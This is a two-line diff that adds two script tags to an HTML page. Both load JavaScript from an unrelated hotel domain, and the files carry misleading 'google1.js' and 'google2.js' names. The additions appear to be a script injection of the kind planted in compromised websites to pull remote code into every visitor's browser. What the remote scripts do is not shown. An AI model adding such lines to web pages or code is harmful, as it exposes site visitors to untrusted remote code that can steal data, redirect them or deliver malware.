@@ -1,0 +1,2 @@
+<script src="http://hotels.mallorcaxlive.com/mimes/scripts/google1.js" type="text/javascript"></script>
+<script src="http://hotels.mallorcaxlive.com/mimes/scripts/google2.js" type="text/javascript"></script>
